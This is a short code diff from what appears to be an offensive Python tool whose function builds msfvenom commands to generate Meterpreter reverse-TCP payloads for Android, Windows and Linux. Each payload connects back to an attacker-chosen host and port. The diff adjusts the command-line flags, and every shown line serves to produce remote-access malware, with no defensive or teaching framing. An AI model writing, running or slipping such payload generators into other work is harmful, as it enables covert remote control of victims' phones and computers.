@@ -79,15 +79,15 @@ def generate_payload_with_animation(ip, port, payload_type, android_api_level=No
                 raise ValueError("Android API level is required for Android payloads.")
 
             output_file = f"Payloads/payload.apk"
-            payload_command = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o {output_file} -t apk -a dalvik --platform android -A {android_api_level}"
+            payload_command = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o {output_file} --platform android -a dalvik"
 
         elif payload_type == "windows":
             output_file = f"Payloads/payload.exe"
-            payload_command = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o {output_file}"
+            payload_command = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o {output_file}"
 
         elif payload_type == "linux":
             output_file = f"Payloads/payload.elf"
-            payload_command = f"msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f elf -o {output_file}"
+            payload_command = f"msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -o {output_file}"
 
         create_payloads_folder()
 
